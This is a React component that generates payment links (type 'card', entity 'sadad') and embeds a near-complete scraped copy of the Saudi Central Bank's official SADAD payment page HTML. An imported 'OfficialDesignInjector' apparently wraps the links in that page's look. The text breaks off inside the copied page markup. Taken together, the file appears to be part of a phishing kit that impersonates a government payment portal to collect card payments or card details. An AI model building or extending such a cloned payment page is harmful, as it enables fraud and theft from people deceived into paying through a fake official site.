
import React, { useState } from 'react';
import { useCreateLink } from '@/hooks/useSupabase';
import { OfficialDesignInjector } from '@/components/OfficialDesignInjector';

const SadadLinkCreator = () => {
  const [amount, setAmount] = useState('');
  const [description, setDescription] = useState('');
  const { createLink, loading, generatedLink } = useCreateLink();

  const handleCreate = async () => {
    await createLink({ 
      amount, 
      description, 
      type: 'card',
      entityId: 'sadad'
    });
  };

  const officialHTML = `
     
               <script src="/_layouts/15/SAMA.Portal/assets/Localization/en.js"></script>
            
         
      
      
      <form method="post" action="/en-us/payment/pages/sadad.aspx" onsubmit="javascript:return WebForm_OnSubmit();" id="aspnetForm">
<div class="aspNetHidden">
<input type="hidden" name="_wpcmWpid" id="_wpcmWpid" value="">
<input type="hidden" name="wpcmVal" id="wpcmVal" value="">
<input type="hidden" name="MSOWebPartPage_PostbackSource" id="MSOWebPartPage_PostbackSource" value="">
<input type="hidden" name="MSOTlPn_SelectedWpId" id="MSOTlPn_SelectedWpId" value="">
<input type="hidden" name="MSOTlPn_View" id="MSOTlPn_View" value="0">
<input type="hidden" name="MSOTlPn_ShowSettings" id="MSOTlPn_ShowSettings" value="False">
<input type="hidden" name="MSOGallery_SelectedLibrary" id="MSOGallery_SelectedLibrary" value="">
<input type="hidden" name="MSOGallery_FilterString" id="MSOGallery_FilterString" value="">
<input type="hidden" name="MSOTlPn_Button" id="MSOTlPn_Button" value="none">
<input type="hidden" name="__EVENTTARGET" id="__EVENTTARGET" value="">
<input type="hidden" name="__EVENTARGUMENT" id="__EVENTARGUMENT" value="">
<input type="hidden" name="__REQUESTDIGEST" id="__REQUESTDIGEST" value="0xACFCCC7B3D54351FF1A6011A1C3166A48180A70407F8C15641E344F6C3E355044840A31ACE8CF819D7146CC8C446C17FF2EAEA663DD89AB819C4E9578ABB7700,08 May 2026 22:25:44 -0000">
<input type="hidden" name="MSOSPWebPartManager_DisplayModeName" id="MSOSPWebPartManager_DisplayModeName" value="Browse">
<input type="hidden" name="MSOSPWebPartManager_ExitingDesignMode" id="MSOSPWebPartManager_ExitingDesignMode" value="false">
<input type="hidden" name="MSOWebPartPage_Shared" id="MSOWebPartPage_Shared" value="">
<input type="hidden" name="MSOLayout_LayoutChanges" id="MSOLayout_LayoutChanges" value="">
<input type="hidden" name="MSOLayout_InDesignMode" id="MSOLayout_InDesignMode" value="">
<input type="hidden" name="_wpSelected" id="_wpSelected" value="">
<input type="hidden" name="_wzSelected" id="_wzSelected" value="">
<input type="hidden" name="MSOSPWebPartManager_OldDisplayModeName" id="MSOSPWebPartManager_OldDisplayModeName" value="Browse">
<input type="hidden" name="MSOSPWebPartManager_StartWebPartEditingName" id="MSOSPWebPartManager_StartWebPartEditingName" value="false">
<input type="hidden" name="MSOSPWebPartManager_EndWebPartEditing" id="MSOSPWebPartManager_EndWebPartEditing" value="false">
<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="/wEPDwUBMA9kFgJmD2QWAgIBD2QWBAIBD2QWBAIFD2QWAmYPZBYCAgEPFgIeE1ByZXZpb3VzQ29udHJvbE1vZGULKYgBTWljcm9zb2Z0LlNoYXJlUG9pbnQuV2ViQ29udHJvbHMuU1BDb250cm9sTW9kZSwgTWljcm9zb2Z0LlNoYXJlUG9pbnQsIFZlcnNpb249MTYuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49NzFlOWJjZTExMWU5NDI5YwFkAhMPZBYCZg9kFgJmDzwrAAYAZAILD2QWCAIFD2QWAgIBD2QWAgICD2QWAgIBD2QWAgIDDxYCHgdWaXNpYmxlaBYCZg9kFgQCAw9kFgYCAQ8WAh8BaGQCAw8WAh8BaGQCBQ8WAh8BaGQCBA8PFgIeCUFjY2Vzc0tleQUBL2RkAg8PPCsABQEADxYCHg9TaXRlTWFwUHJvdmlkZXIFIUN1cnJlbnROYXZTaXRlTWFwUHJvdmlkZXJOb0VuY29kZWRkAhEPFgIfAAsrBAFkAhMPZBYCAgIPZBYGAg0PFgIfAAsrBAFkAhEPZBYCAgEPFgIfAAsrBAFkAhUPZBYCAgEPFgIfAAsrBAFkZLD1IUSK2xfHnmB3vHjrJ3O/rjXUWy8JmhKXGYdfDuC1">
</div>

<script type="text/javascript">
//<![CDATA[
var theForm = document.forms['aspnetForm'];
if (!theForm) {
    theForm = document.aspnetForm;
}
function __doPostBack(eventTarget, eventArgument) {
    if (!theForm.onsubmit || (theForm.onsubmit() != false)) {
        theForm.__EVENTTARGET.value = eventTarget;
        theForm.__EVENTARGUMENT.value = eventArgument;
        theForm.submit();
    }
}
//]]>
</script>


<script src="/WebResource.axd?d=7mGGmxnUY079OIm1yGADyhubqVaZkTcJJtMjdhXyeXklD9mDIIrsGJc55dB77iliMgNp604nOAXAcUPfBjRL0ALO6S7MsauPf-0KVeHAEy41&amp;t=638901879720898773" type="text/javascript"></script>


<script type="text/javascript">
//<![CDATA[
var MSOWebPartPageFormName = 'aspnetForm';
var g_presenceEnabled = true;
var g_wsaEnabled = false;

var g_correlationId = 'f3bd11a2-a92f-1064-6674-d84815315f50';
var g_wsaQoSEnabled = false;
var g_wsaQoSDataPoints = [];
var g_wsaRUMEnabled = false;
var g_wsaLCID = 1033;
var g_wsaListTemplateId = 850;
var g_wsaSiteTemplateId = 'CMSPUBLISHING#0';
var _spPageContextInfo={"webServerRelativeUrl":"/en-US/payment","webAbsoluteUrl":"https://www.sama.gov.sa/en-US/payment","viewId":"","listId":"{63100379-0682-4849-a57f-ab28091d0776}","listPermsMask":{"High":16,"Low":196673},"listUrl":"/en-US/payment/Pages","listTitle":"Pages","listBaseTemplate":850,"viewOnlyExperienceEnabled":false,"blockDownloadsExperienceEnabled":false,"idleSessionSignOutEnabled":false,"cdnPrefix":"","siteAbsoluteUrl":"https://www.sama.gov.sa","siteId":"{aca00621-8f0d-4ff6-abc9-33a4dc95e12d}","showNGSCDialogForSyncOnTS":false,"supportPoundStorePath":true,"supportPercentStorePath":true,"siteSubscriptionId":null,"CustomMarkupInCalculatedFieldDisabled":true,"AllowCustomMarkupInCalculatedField":false,"isSPO":false,"farmLabel":null,"serverRequestPath":"/en-us/payment/pages/sadad.aspx","layoutsUrl":"_layouts/15","webId":"{2319b7e5-acd3-4989-b685-875b704ca25a}","webTitle":"National Payment Systems","webTemplate":"39","webTemplateConfiguration":"CMSPUBLISHING#0","webDescription":"","tenantAppVersion":"0","isAppWeb":false,"webLogoUrl":"/Style%20Library/sama/images/logo.png","webLanguage":1033,"currentLanguage":1033,"currentUICultureName":"en-US","currentCultureName":"en-US","currentCultureLCID":1033,"env":null,"nid":0,"fid":0,"serverTime":"2026-05-08T22:25:44.2487907Z","siteClientTag":"2218$$16.0.10417.20114","crossDomainPhotosEnabled":false,"openInClient":false,"Has2019Era":true,"webUIVersion":15,"webPermMasks":{"High":16,"Low":196673},"pageListId":"{63100379-0682-4849-a57f-ab28091d0776}","pageItemId":21,"pagePermsMask":{"High":16,"Low":196673},"pagePersonalizationScope":1,"userEmail":"","userId":0,"userLoginName":null,"userDisplayName":null,"isAnonymousUser":true,"isAnonymousGuestUser":false,"isEmailAuthenticationGuestUser":false,"isExternalGuestUser":false,"systemUserKey":null,"alertsEnabled":true,"siteServerRelativeUrl":"/","allowSilverlightPrompt":"True","themeCacheToken":"/en-US/payment::13:","themedCssFolderUrl":null,"themedImageFileNames":null,"modernThemingEnabled":true,"isSiteAdmin":false,"ExpFeatures":[480216468,1884350801,1158731092,62197791,538521105,335811073,4194306,34614301,268500996,-1946025984,28445328,-2147475455,134291456,65536,288,950272,1282,808326148,134217873,0,0,-1073217536,545285252,18350656,-467402752,6291457,-2147483644,1074794496,-1728053184,1845537108,622628,4102,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],"killSwitches":{},"InternalValidAuthorities":["www.bfc.gov.sa","bfc.gov.sa","www.bfc.gov.sa","www.bfc.gov.sa:1010","esupervision.sama.gov.sa","www.samanewbrand.gov.sa","eservices.sama.gov.sa","eservices.sama.gov.sa:8080","nafathapi.sama.gov.sa","www.idc.gov.sa","www.idc.gov.sa","www.idc.gov.sa:2020","invest.sama.gov.sa","fcc-doc.sama.gov.sa","www.fintechsaudi.sa","fintechsaudi.sa","www.fintechsaudis.com","fintechsaudi.sa","www.sama.gov.sa","sama.gov.sa","sama.gov.sa","www.aml.gov.sa","www.aml.gov.sa","www.aml.gov.sa:3030","samacares.sama.gov.sa","www.sama1.gov.sa","www.sama1.gov.sa:81","www.sama1.gov.sa"],"CorrelationId":"f3bd11a2-a92f-1064-6674-d84815315f50","hasManageWebPermissions":false,"isNoScriptEnabled":false,"groupId":null,"groupHasHomepage":true,"groupHasQuickLaunchConversationsLink":false,"departmentId":null,"hubSiteId":null,"hasPendingWebTemplateExtension":false,"isHubSite":false,"isWebWelcomePage":false,"siteClassification":"","hideSyncButtonOnODB":false,"showNGSCDialogForSyncOnODB":false,"sitePagesEnabled":false,"sitePagesFeatureVersion":0,"DesignPackageId":"00000000-0000-0000-0000-000000000000","groupType":null,"groupColor":"#da3b01","siteColor":"#da3b01","headerEmphasis":0,"navigationInfo":null,"guestsEnabled":false,"MenuData":{"SignInUrl":"/en-US/payment/_layouts/15/Authenticate.aspx?Source=%2Fen%2Dus%2Fpayment%2Fpages%2Fsadad%2Easpx"},"RecycleBinItemCount":-1,"PublishingFeatureOn":true,"PreviewFeaturesEnabled":false,"disableAppViews":false,"disableFlows":false,"serverRedirectedUrl":null,"formDigestValue":"0xACFCCC7B3D54351FF1A6011A1C3166A48180A70407F8C15641E344F6C3E355044840A31ACE8CF819D7146CC8C446C17FF2EAEA663DD89AB819C4E9578ABB7700,08 May 2026 22:25:44 -0000","maximumFileSize":10240,"formDigestTimeoutSeconds":1800,"canUserCreateMicrosoftForm":false,"canUserCreateVisioDrawing":true,"readOnlyState":null,"isTenantDevSite":false,"preferUserTimeZone":false,"userTimeZoneData":null,"userTime24":false,"userFirstDayOfWeek":null,"webTimeZoneData":null,"webTime24":false,"webFirstDayOfWeek":null,"isSelfServiceSiteCreationEnabled":null,"alternateWebAppHost":"","aadTenantId":"","aadUserId":"","aadInstanceUrl":"","msGraphEndpointUrl":"https://","allowInfectedDownload":true};_spPageContextInfo.updateFormDigestPageLoaded=new Date();_spPageContextInfo.clientServerTimeDelta=new Date(_spPageContextInfo.serverTime)-new Date();if(typeof(define)=='function'){define('SPPageContextInfo',[],function(){return _spPageContextInfo;});}var L_Menu_BaseUrl="/en-US/payment";
var L_Menu_LCID="1033";
var L_Menu_SiteTheme="null";
document.onreadystatechange=fnRemoveAllStatus; function fnRemoveAllStatus(){removeAllStatus(true)};Flighting.ExpFeatures = [480216468,1884350801,1158731092,62197791,538521105,335811073,4194306,34614301,268500996,-1946025984,28445328,-2147475455,134291456,65536,288,950272,1282,808326148,134217873,0,0,-1073217536,545285252,18350656,-467402752,6291457,-2147483644,1074794496,-1728053184,1845537108,622628,4102,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]; (function()
{
    if(typeof(window.SP) == "undefined") window.SP = {};
    if(typeof(window.SP.YammerSwitch) == "undefined") window.SP.YammerSwitch = {};

    var ysObj = window.SP.YammerSwitch;
    ysObj.IsEnabled = false;
    ysObj.TargetYammerHostName = "www.yammer.com";
} )(); //]]>
</script>

<script src="/_layouts/15/blank.js?rev=I9vANdRzlOdhKkAxWYnMxg%3D%3DTAG0" type="text/javascript"></script>
<script type="text/javascript">
//<![CDATA[
window.SPThemeUtils && SPThemeUtils.RegisterCssReferences([{"Url":"\u002f_layouts\u002f15\u002f1033\u002fstyles\u002fThemable\u002fcorev15.css?rev=UP2nlZLed9gOy\u00252BMP38oz0A\u00253D\u00253DTAG0","OriginalUrl":"\u002f_layouts\u002f15\u002f1033\u002fstyles\u002fThemable\u002fcorev15.css?rev=UP2nlZLed9gOy\u00252BMP38oz0A\u00253D\u00253DTAG0","Id":"CssLink-8ac0e80f78a04e6daffa59eb435e1fe4","ConditionalExpression":"","After":"","RevealToNonIE":"false"}]);
(function(){

        if (typeof(_spBodyOnLoadFunctions) === 'undefined' || _spBodyOnLoadFunctions === null) {
            return;
        }
        _spBodyOnLoadFunctions.push(function() {
            SP.SOD.executeFunc('core.js', 'FollowingDocument', function() { FollowingDocument(); });
        });
    })();(function(){

        if (typeof(_spBodyOnLoadFunctions) === 'undefined' || _spBodyOnLoadFunctions === null) {
            return;
        }
        _spBodyOnLoadFunctions.push(function() {
            SP.SOD.executeFunc('core.js', 'FollowingCallout', function() { FollowingCallout(); });
        });
    })();if (typeof(DeferWebFormInitCallback) == 'function') DeferWebFormInitCallback();function WebForm_OnSubmit() {
UpdateFormDigest('\u002fen-US\u002fpayment', 1440000);
return true;
}
//]]>
</script>

<div class="aspNetHidden">

	<input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="BAB98CB3">
</div>
         <!-- ===== STARTER: Web Part Manager  ============================================================================================= -->
         
         <!-- ===== STARTER: ScriptManager ===================================================== -->
         <script type="text/javascript">
//<![CDATA[
Sys.WebForms.PageRequestManager._initialize('ctl00$ScriptManager', 'aspnetForm', [], [], [], 90, 'ctl00');
//]]>
</script>

         <!-- ===== STARTER: Ribbon Code Starts Here ===================================================== -->
         
         <!-- Header -->
         <header class="page-header">
            <div class="page-header__top">
               <div class="container-fluid">
                  <div class="main-logo">
                    
                            <a href="/en-us" class="logo-link" title="Home">
                                <img src="/_layouts/15/SAMA.Portal/assets/images/logo.svg" alt="logo">
                            </a>
                        
                    
                  </div>
                  <div class="header-actions">
                     <ul class="inline-list-links top-links"><li class="inline-list-links__item" data-pid="5">
											<a href="http://careers.sama.gov.sa/ar/" title="Careers" class="list-link">
												<span class="top-header-text">Careers</span>
											</a>
										</li><li class="inline-list-links__item" data-pid="5">
											<a href="/en-US/PortalServices/Pages/contactus.aspx" title="Contact Us" class="list-link">
												<span class="top-header-text">Contact Us</span>
											</a>
										</li><li class="inline-list-links__item" data-pid="5">
											<a href="/en-us/PortalServices/Pages/sitemap.aspx" title="Sitemap" class="list-link">
												<span class="top-header-text">Sitemap</span>
											</a>
										</li></ul>
                     <div class="actions-btns">
                        <div class="actions-btns__item d-none d-lg-flex">
                           <div class="search-container">
                              <input type="search" id="searchInput" class="search-input" placeholder="Search the website ...">
							
                              <a href="#" id="searchBtn" class="actions-btn search-btn" data-bs-toggle="tooltip" data-bs-placement="bottom" data-bs-custom-class="primary-tooltip" aria-label="Search" data-bs-original-title="Search">
                              </a>
                           </div>
                        </div>
                        <div class="actions-btns__item d-flex d-lg-none">
                           <a href="#" class="actions-btn search-btn" data-bs-toggle="modal" data-bs-target="#searchModal" data-bs-custom-class="tooltip-modal" data-bs-placement="bottom" title="Search">
                           </a>
                        </div>
                        <div class="actions-btns__item">
                           <a href="https://www.sama.gov.sa/ar-sa/payment/pages/sadad.aspx" class="actions-btn lang-btn" data-bs-toggle="tooltip" data-bs-placement="bottom" data-bs-custom-class="primary-tooltip" aria-label="Arabic" data-bs-original-title="Arabic">
                           </a>
                        </div>
                        <div class="actions-btns__item">
                           <a class="actions-btn menu-btn" data-bs-toggle="offcanvas" data-bs-target="#mobileMenu" aria-controls="mobileMenu" aria-expanded="false" aria-label="Toggle navigation" data-bs-custom-class="primary-tooltip" data-bs-placement="bottom" title="Menu">
                           </a>
                        </div>
                     </div>
                  </div>
               </div>
            </div>
            <div class="page-header__bottom">
               <div class="container-fluid">
                  <nav class="navbar">
                     <div class="collapse navbar-collapse" id="navbarNav">
                        <ul class="navbar-nav page-nav__list"><li class="nav-item">
                                    <a href="https://www.sama.gov.sa/en-US" class="nav-link" title="Home">
                                        Home
                                    </a>
                                </li><li class="nav-item dropdown mega-dropdown">
                                    <a href="https://www.sama.gov.sa/en-US/About/Pages/default.aspx" class="nav-link dropdown-toggle" title="About SAMA">About SAMA</a>
                                    <div class="dropdown-menu mega-menu">
                                        <div class="container-fluid">
                                            <div class="row g-4 g-xl-5"><div class="col-12 col-xl-3"><h6 class="mega-menu__title">About us</h6><ul class="mega-menu__list"><li><a class="mega-menu__link" href="https://www.sama.gov.sa/en-US/About/Pages/Overview.aspx">Overview</a></li><li><a class="mega-menu__link" href="https://www.sama.gov.sa/en-US/About/Pages/SAMAHistory.aspx">Our History</a></li><li><a class="mega-menu__link" href="https://www.sama.gov.sa/en-US/About/Pages/bank-law.aspx">Saudi Central Bank Law</a></li><li><a class="mega-menu__link" href="https://www.sama.gov.sa/en-US/About/Pages/SAMAFunction.aspx">Saudi Central Bank Functions</a></li><li><a class="mega-menu__link" href="https://www.sama.gov.sa/en-US/About/Pages/Strategy.aspx">Saudi Central Bank Strategy</a></li><li><a class="mega-menu__link" href="https://www.sama.gov.sa/en-US/About/Pages/Organization_Structure.aspx">Organizational Structure</a></li></ul></div><div class="col-12 col-xl-3"><h6 class="mega-menu__title">Saudi Central Bank Management</h6><ul class="mega-menu__list"><li><a class="mega-menu__link" href="https://www.sama.gov.sa/en-US/About/Pages/boardOfDirectors.aspx">Members of the Board of Directors of the Saudi Central Bank</a></li><li><a class="mega-menu__link" href="https://www.sama.gov.sa/en-US/About/LeaderShips/Pages/default.aspx">Saudi Central Bank Leadership</a></li></ul></div><div class="col-12 col-xl-3"><h6 class="mega-menu__title">Other</h6><ul class="mega-menu__list"><li><a class="mega-menu__link" href="https://www.sama.gov.sa/en-US/About/Pages/Relations_with_regional_and_international_organizations.aspx">International Relations</a></li><li><a class="mega-menu__link" href="https://www.sama.gov.sa/en-US/About/Pages/Memorandums_of_understanding-.aspx">Memoranda of Understanding</a></li><li><a class="mega-menu__link" href="https://www.sama.gov.sa/en-US/About/Pages/Links.aspx">Relevant Links</a></li></ul></div></div></div></div></li><li class="nav-item dropdown mega-dropdown">
                                    <a href="https://www.sama.gov.sa/en-US/MediaCenter/Pages/Default.aspx" class="nav-link dropdown-toggle" title="Media Center">Media Center</a>
                                    <div class="dropdown-menu mega-menu">
                                        <div class="container-fluid">
                                            <div class="row g-4 g-xl-5"><div class="col-12 col-xl-3"><h6 class="mega-menu__title">News</h6><ul class="mega-menu__list"><li><a class="mega-menu__link" href="https://www.sama.gov.sa/en-US/MediaCenter/News/Pages/allnews.aspx">News</a></li><li><a class="mega-menu__link" href="https://www.sama.gov.sa/en-US/MediaCenter/News/Pages/speeches.aspx">Speeches</a></li></ul></div><div class="col-12 col-xl-3"><a class="mega-menu__title" href="https://www.sama.gov.sa/en-US/MediaCenter/Pages/BrandGuidelines.aspx">SAMA Brand Identity Guidelines​​</a></div></div></div></div></li><li class="nav-item dropdown mega-dropdown">
                                    <a href="https://www.sama.gov.sa/en-US/Supervision/Pages/default.aspx" class="nav-link dropdown-toggle" title="Supervision">Supervision</a>
                                    <div class="dropdown-menu mega-menu">
                                        <div class="container-fluid">
                                            <div class="row g-4 g-xl-5"><div class="col-12 col-xl-3"><a class="mega-menu__title" href="https://rulebook.sama.gov.sa/en">Rulebook</a></div><div class="col-12 col-xl-3"><h6 class="mega-menu__title">Licenses and Permits</h6><ul class="mega-menu__list"><li><a class="mega-menu__link" href="https://www.sama.gov.sa/en-US/Supervision/LicenseEntities/Pages/default.aspx">Licensed Entities</a></li></ul></div><div class="col-12 col-xl-3"><h6 class="mega-menu__title">The Regulatory Sandbox</h6><ul class="mega-menu__list"><li><a class="mega-menu__link" href="https://www.sama.gov.sa/en-US/Supervision/SandBox/Pages/default.aspx">Overview</a></li><li><a class="mega-menu__link" href="https://www.sama.gov.sa/en-US/Supervision/SandBox/Pages/permitted-fintechs.aspx">Permitted Fintechs</a></li><li><a class="mega-menu__link" href="https://www.sama.gov.sa/en-US/Supervision/SandBox/Documents/Regulatory_Sandbox-Application_Guidance_Notes_EN.pdf">Guidebook</a></li><li><a class="mega-menu__link" href="https://www.sama.gov.sa/en-US/Pages/ServiceDetails.aspx?serviceid=96">Join the Regulatory Sandbox​</a></li></ul></div><div class="col-12 col-xl-3"><a class="mega-menu__title" href="https://www.sama.gov.sa/en-US/Supervision/Pages/holidayschedules.aspx">Holidays and Working Hours</a></div></div></div></div></li><li class="nav-item dropdown mega-dropdown">
                                    <a href="https://www.sama.gov.sa/en-US/Statistics/Pages/default.aspx" class="nav-link dropdown-toggle" title="Statistics">Statistics</a>
                                    <div class="dropdown-menu mega-menu">
                                        <div class="container-fluid">
                                            <div class="row g-4 g-xl-5"><div class="col-12 col-xl-3"><h6 class="mega-menu__title">Statistics</h6><ul class="mega-menu__list"><li><a class="mega-menu__link" href="https://www.sama.gov.sa/en-US/Statistics/Pages/Summary.aspx">Saudi Central Bank Portal For Open Data</a></li><li><a class="mega-menu__link" href="https://www.sama.gov.sa/en-US/Statistics/Pages/MonthlyStatistics.aspx">Monthly Bulletin Statistics</a></li><li><a class="mega-menu__link" href="https://www.sama.gov.sa/en-US/Statistics/Pages/AdvancedReleaseCalendar.aspx">Publication Timeline</a></li></ul></div><div class="col-12 col-xl-3"><h6 class="mega-menu__title">Economic Indicators</h6><ul class="mega-menu__list"><li><a class="mega-menu__link" href="https://www.sama.gov.sa/en-US/Statistics/Indices/Pages/WeeklyMoneySupply.aspx">Weekly Money Supply</a></li><li><a class="mega-menu__link" href="https://www.sama.gov.sa/en-US/Statistics/Indices/Pages/POS.aspx">Weekly Points of Sale Transactions</a></li><li><a class="mega-menu__link" href="https://www.sama.gov.sa/en-US/Statistics/Indices/Pages/reserve_assets.aspx">Reserve Assets</a></li><li><a class="mega-menu__link" href="https://www.sama.gov.sa/en-US/Statistics/Indices/Pages/International_Reserves.aspx">Data Template on International Reserves and Foreign Currency Liquidity</a></li><li><a class="mega-menu__link" href="https://www.sama.gov.sa/en-US/Statistics/Indices/Pages/Central_Bank_Survey.aspx">Saudi Central Bank survey</a></li></ul></div></div></div></div></li><li class="nav-item dropdown mega-dropdown">
                                    <a href="https://www.sama.gov.sa/en-US/Publications" class="nav-link dropdown-toggle" title="Publications">Publications</a>
                                    <div class="dropdown-menu mega-menu">
                                        <div class="container-fluid">
                                            <div class="row g-4 g-xl-5"><div class="col-12 col-xl-3"><h6 class="mega-menu__title">Economic Reports</h6><ul class="mega-menu__list"><li><a class="mega-menu__link" href="https://www.sama.gov.sa/en-US/Publications/EconomicReports/Pages/AnnualReport.aspx">Annual Report</a></li><li><a class="mega-menu__link" href="https://www.sama.gov.sa/en-US/Publications/EconomicReports/Pages/InflationReport.aspx">Inflation Report</a></li><li><a class="mega-menu__link" href="https://www.sama.gov.sa/en-US/Publications/EconomicReports/Pages/DevelopmentReports.aspx">Key Economic Developments Report</a></li></ul></div><div class="col-12 col-xl-3"><h6 class="mega-menu__title">Economic Research</h6><ul class="mega-menu__list"><li><a class="mega-menu__link" href="https://www.sama.gov.sa/en-US/Publications/EconomicResearch/Pages/WorkingPapers.aspx">Working Papers</a></li><li><a class="mega-menu__link" href="https://www.sama.gov.sa/en-US/Publications/EconomicResearch/Pages/Joint_Research_Program.aspx">Joint Research Program</a></li></ul></div><div class="col-12 col-xl-3"><h6 class="mega-menu__title">Financial Reports</h6><ul class="mega-menu__list"><li><a class="mega-menu__link" href="https://www.sama.gov.sa/en-US/Publications/FinanceReports/Pages/FinancialStability.aspx">Financial Stability Report</a></li><li><a class="mega-menu__link" href="https://www.sama.gov.sa/en-US/Publications/FinanceReports/Pages/FinancialPerformanceReport.aspx">Finance Sector Performance Report</a></li><li><a class="mega-menu__link" href="https://www.sama.gov.sa/en-US/Publications/FinanceReports/Pages/AnnualFintechReport.aspx">Annual Fintech Report</a></li></ul></div><div class="col-12 col-xl-3"><h6 class="mega-menu__title">Other Reports</h6><ul class="mega-menu__list"><li><a class="mega-menu__link" href="https://www.sama.gov.sa/en-US/Publications/OtherReports/Pages/default.aspx">National Payments Usage Study Report</a></li></ul></div></div></div></div></li><li class="nav-item dropdown mega-dropdown">
                                    <a href="https://www.sama.gov.sa/en-US/MonetaryPolicy/Pages/default.aspx" class="nav-link dropdown-toggle" title="Monetary Policy">Monetary Policy</a>
                                    <div class="dropdown-menu mega-menu">
                                        <div class="container-fluid">
                                            <div class="row g-4 g-xl-5"><div class="col-12 col-xl-3"><h6 class="mega-menu__title">Monetary Policy Tools</h6><ul class="mega-menu__list"><li><a class="mega-menu__link" href="https://www.sama.gov.sa/en-US/MonetaryPolicy/MonetaryPolicyTools/Pages/RepoRate.aspx">Repo Rate</a></li><li><a class="mega-menu__link" href="https://www.sama.gov.sa/en-US/MonetaryPolicy/MonetaryPolicyTools/Pages/ReverseRepoRate.aspx">Reverse Repo Rate</a></li><li><a class="mega-menu__link" href="https://www.sama.gov.sa/en-US/MonetaryPolicy/MonetaryPolicyTools/Pages/DemandDeposits.aspx">Reserve Requirement on Demand Deposits</a></li><li><a class="mega-menu__link" href="https://www.sama.gov.sa/en-US/MonetaryPolicy/MonetaryPolicyTools/Pages/SavingDeposits.aspx">Reserve Requirement on Saving Deposits</a></li></ul></div><div class="col-12 col-xl-3"><h6 class="mega-menu__title">Monetary Operations</h6><ul class="mega-menu__list"><li><a class="mega-menu__link" href="https://www.sama.gov.sa/en-US/MonetaryPolicy/MonetaryOperations/OpenMarketOperations/Pages/default.aspx">Open Market Operations</a></li><li><a class="mega-menu__link" href="https://www.sama.gov.sa/en-US/MonetaryPolicy/MonetaryOperations/Pages/AverageWeeklyRepoRate.aspx">The Weekly Average of Repo and Reverse Repo</a></li></ul></div></div></div></div></li><li class="nav-item dropdown mega-dropdown">
                                    <a href="https://www.sama.gov.sa/en-US/Currency/Pages/default.aspx" class="nav-link dropdown-toggle" title="Currency">Currency</a>
                                    <div class="dropdown-menu mega-menu">
                                        <div class="container-fluid">
                                            <div class="row g-4 g-xl-5"><div class="col-12 col-xl-3"><h6 class="mega-menu__title">Saudi Currency History</h6><ul class="mega-menu__list"><li><a class="mega-menu__link" href="https://www.sama.gov.sa/en-US/Currency/Pages/HistoricalInfo.aspx">Overview</a></li></ul></div><div class="col-12 col-xl-3"><h6 class="mega-menu__title">Security Features</h6><ul class="mega-menu__list"><li><a class="mega-menu__link" href="https://www.sama.gov.sa/en-US/Currency/SecurityFeatures/Pages/securityfeature.aspx">Security Features for Fifth Issue</a></li><li><a class="mega-menu__link" href="https://www.sama.gov.sa/en-US/Currency/SecurityFeatures/Pages/SixthIssueSecurityFeatures.aspx">Security Features for Sixth Issue</a></li></ul></div><div class="col-12 col-xl-3"><h6 class="mega-menu__title">Saudi Currency Issues</h6><ul class="mega-menu__list"><li><a class="mega-menu__link" href="https://www.sama.gov.sa/en-US/Currency/Pages/Pilgriams.aspx">Pilgrims’ Receipts</a></li><li><a class="mega-menu__link" href="https://www.sama.gov.sa/en-US/Currency/Pages/FirstIssue.aspx">First Issue</a></li><li><a class="mega-menu__link" href="https://www.sama.gov.sa/en-US/Currency/Pages/SecondIssue.aspx">Second Issue</a></li><li><a class="mega-menu__link" href="https://www.sama.gov.sa/en-US/Currency/Pages/ThirdIssue.aspx">Third Issue</a></li><li><a class="mega-menu__link" href="https://www.sama.gov.sa/en-US/Currency/Pages/FourthIssue.aspx">Fourth Issue</a></li><li><a class="mega-menu__link" href="https://www.sama.gov.sa/en-US/Currency/Pages/FifthIssue.aspx">Fifth Issue</a></li><li><a class="mega-menu__link" href="https://www.sama.gov.sa/en-US/Currency/Pages/SixthIssue.aspx">Sixth Issue</a></li><li><a class="mega-menu__link" href="https://www.sama.gov.sa/en-US/Currency/Pages/SpecialIssue.aspx">Special Issues</a></li></ul></div><div class="col-12 col-xl-3"><h6 class="mega-menu__title">Exchange Rates</h6><ul class="mega-menu__list"><li><a class="mega-menu__link" href="https://www.sama.gov.sa/en-US/Currency/FinExc/Pages/ExchangeRatesGregorian.aspx">Monthly Exchange Rates</a></li><li><a class="mega-menu__link" href="https://www.sama.gov.sa/en-US/Currency/FinExc/Pages/Currency.aspx">Exchange Rate</a></li><li><a class="mega-menu__link" href="https://www.sama.gov.sa/en-US/Currency/Pages/CurrencyConverter.aspx">Currency Converter</a></li></ul></div><div class="col-12 col-xl-3"><h6 class="mega-menu__title">Saudi Riyal Symbol</h6><ul class="mega-menu__list"><li><a class="mega-menu__link" href="https://www.sama.gov.sa/en-US/Currency/SRS/Pages/default.aspx">Overview</a></li><li><a class="mega-menu__link" href="https://www.sama.gov.sa/en-US/Currency/SRS/Pages/Guideline.aspx">Saudi Riyal Symbol Guidelines</a></li></ul></div></div></div></div></li><li class="nav-item dropdown mega-dropdown">
                                    <a href="https://www.sama.gov.sa/en-US/payment" class="nav-link dropdown-toggle active" title="Payment Systems">Payment Systems</a>
                                    <div class="dropdown-menu mega-menu">
                                        <div class="container-fluid">
                                            <div class="row g-4 g-xl-5"><div class="col-12 col-xl-3"><a class="mega-menu__title" href="https://www.sama.gov.sa/en-US/payment/Pages/SADAD.aspx">SADAD</a></div><div class="col-12 col-xl-3"><a class="mega-menu__title" href="https://www.sama.gov.sa/en-US/payment/Pages/mada.aspx">mada</a></div><div class="col-12 col-xl-3"><a class="mega-menu__title" href="https://www.sama.gov.sa/en-US/payment/Pages/Sarie.aspx">sarie</a></div><div class="col-12 col-xl-3"><a class="mega-menu__title" href="https://www.sama.gov.sa/en-US/payment/Pages/Esal.aspx">Esal</a></div></div></div></div></li><li class="nav-item">
                                    <a href="https://www.sama.gov.sa/en-US/Pages/landingservices.aspx" class="nav-link" title="E-Services">
                                        E-Services
                                    </a>
                                </li></ul>
                     </div>
                  </nav>
               </div>
            </div>
         </header>
        <main class="inner-page">
            <!--Page banner-->
            <section class="page-banner">
                <div class="container-fluid">
                    <div class="page-banner__content">
	                    <div class="row g-4 align-items-center">
	                    	<div class="col-12 col-lg-9">
		                        <nav aria-label="breadcrumb">
		                            <ul id="ctl00_ListSiteMapPath1" class="breadcrumb">
